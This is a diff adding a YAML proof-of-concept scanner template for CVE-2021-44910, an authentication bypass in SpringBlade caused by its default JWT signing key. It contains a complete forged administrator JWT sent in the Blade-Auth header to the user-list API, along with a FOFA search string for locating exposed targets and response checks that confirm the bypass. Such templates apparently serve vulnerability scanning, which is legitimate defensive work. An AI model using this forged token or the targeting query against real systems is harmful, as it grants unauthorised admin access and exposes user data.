@@ -1,0 +1,20 @@
+id: poc-yaml-springblade-default-jwt-key-authentication-bypass
+info:
+  name: Springblade 默认密钥 伪造凭据身份验证绕过(CVE-2021-44910)
+  severity: high
+  tags:
+  - 两高一弱
+  - 认证绕过
+  - CVE-2021-44910
+  finger: springblade
+  fofa: body="https://bladex.vip"
+requests:
+- method: GET
+  path: /api/blade-user/user-list
+  headers:
+    Blade-Auth: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":200\") &&\ncontains(body,\"\
+    \\\"success\\\":true\") &&\ncontains(body,`\"data\":[`) &&\ncontains(body,`\"\
+    name\"`) &&\n!contains(body,\"<\") &&\ncontains(headers,\"application/json\")\n"
+variables: {}
+transport: http
